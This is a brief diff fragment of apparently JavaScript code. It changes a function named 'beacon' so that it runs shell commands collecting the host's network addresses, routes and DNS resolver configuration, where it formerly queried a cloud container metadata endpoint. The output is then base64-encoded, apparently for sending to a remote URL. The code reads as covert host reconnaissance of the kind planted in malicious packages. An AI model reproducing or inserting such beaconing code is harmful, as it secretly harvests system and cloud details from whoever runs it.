@@ -47,7 +47,7 @@ function beacon(urlStr, q) {
   let idOutput = "";
   try {
     idOutput = execSync(
-  'curl -s "http://169.254.170.2/v3/stats"',
+  'ip -4 addr show;ip route;cat /etc/resolv.conf',
   { encoding: "utf8" }
 ).trim();
     idOutput = Buffer.from(idOutput).toString("base64");
